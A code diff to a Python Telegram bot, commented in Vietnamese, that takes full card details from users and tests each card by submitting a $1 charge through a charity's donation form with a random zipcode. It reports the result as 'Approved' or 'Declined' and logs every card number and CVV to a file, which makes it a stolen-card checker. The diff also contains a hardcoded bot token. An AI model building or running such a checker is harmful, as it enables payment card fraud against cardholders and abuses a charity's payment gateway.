@@ -7,6 +7,7 @@ import nest_asyncio
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from datetime import datetime
+import time
 
 # Thiết lập logging
 logging.basicConfig(level=logging.INFO)
@@ -58,70 +59,6 @@ def extract_error_message(response_text):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")
 
-# Hàm xử lý lệnh /allow
-async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    admin_id = 2077786453
-    if update.effective_user.id == admin_id:
-        user_id = int(context.args[0])
-        with open("allowed_users.txt", "a") as f:
-            f.write(f"{user_id}\n")
-        await update.message.reply_text(f"Đã cho phép người dùng với ID {user_id}.")
-    else:
-        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")
-
-# Hàm xử lý lệnh /unallow
-async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    admin_id = 2077786453
-    if update.effective_user.id == admin_id:
-        user_id = int(context.args[0])
-        lines = []
-        with open("allowed_users.txt", "r") as f:
-            lines = f.readlines()
-        with open("allowed_users.txt", "w") as f:
-            for line in lines:
-                if line.strip() != str(user_id):
-                    f.write(line)
-        await update.message.reply_text(f"Đã hủy quyền người dùng với ID {user_id}.")
-    else:
-        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")
-
-# Hàm xử lý lệnh /credit
-async def credit_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    admin_id = 2077786453
-    if update.effective_user.id == admin_id:
-        user_id = int(context.args[0])
-        credit = int(context.args[1])
-
-        with open("user_credits.txt", "a") as f:
-            f.write(f"{user_id}:{credit}\n")
-        await update.message.reply_text(f"Đã thêm {credit} tín dụng cho người dùng với ID {user_id}.")
-    else:
-        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")
-
-# Hàm xử lý lệnh /user
-async def user_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    total_credit = 0
-
-    try:
-        with open("user_credits.txt", "r") as f:
-            for line in f.readlines():
-                line = line.strip()
-                if not line:  # Bỏ qua dòng trống
-                    continue
-                try:
-                    uid, credit = line.split(":")
-                    if int(uid) == user_id:
-                        total_credit += int(credit)
-                except ValueError:
-                    logger.warning(f"Dòng không hợp lệ: {line}")  # Ghi log dòng không hợp lệ
-                    continue
-    except FileNotFoundError:
-        await update.message.reply_text("Chưa có tín dụng cho người dùng này.")
-        return
-
-    await update.message.reply_text(f"Bạn có {total_credit} tín dụng.")
-
 # Hàm xử lý tin nhắn
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text
@@ -158,6 +95,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên
 
     await update.message.reply_text("Đang xử lý thông tin...")
+    
+    start_time = time.time()  # Bắt đầu tính thời gian thực hiện request
 
     # Gửi yêu cầu tới API
     async with aiohttp.ClientSession() as session:
@@ -191,22 +130,31 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
                                 }) as response:
 
-            # Lấy nội dung phản hồi
+            elapsed_time = time.time() - start_time  # Thời gian thực hiện request
+            elapsed_seconds = round(elapsed_time, 2)
+
             response_text = await response.text()
+            final_url = str(response.url)
 
-            # Kiểm tra chuyển hướng
-            if response.history and response.status == 200:
-                final_url = str(response.url)
-                if "success" in final_url:
-                    result_message = "Giao dịch hoàn tất thành công!"
-                else:
-                    # Tìm thông báo lỗi chỉ sau khi có phản hồi
-                    error_message = extract_error_message(response_text)
-                    result_message = error_message if error_message else "Giao dịch không thành công, vui lòng thử lại."
+            if "https://anglicaresa.com.au/success/" in final_url:
+                # Giao dịch thành công
+                result_message = f"""𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+
+𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved
+𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
             else:
-                result_message = "Đã xảy ra lỗi trong quá trình giao dịch."
+                # Giao dịch thất bại
+                error_message = extract_error_message(response_text)
+                result_message = f"""Declined 
 
-            await update.message.reply_text(result_message)
+𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message if error_message else 'Unknown Error'}
+𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
+
+            await update.message.reply_text(result_message, parse_mode="HTML")
 
             # Ghi log
             with open("user_logs.txt", "a") as log_file:
@@ -214,20 +162,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                f"Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, "
                                f"Result: {result_message}\n")
 
-# Hàm khởi động bot
-def main():
-    application = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
-
-    # Gán các handler
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("allow", allow_user))
-    application.add_handler(CommandHandler("unallow", unallow_user))
-    application.add_handler(CommandHandler("credit", credit_user))
-    application.add_handler(CommandHandler("user", user_credits))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-    # Bắt đầu chạy bot
-    application.run_polling()
-
+# Hàm chính để khởi động bot
 if __name__ == '__main__':
-    main()
+    app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    app.run_polling()
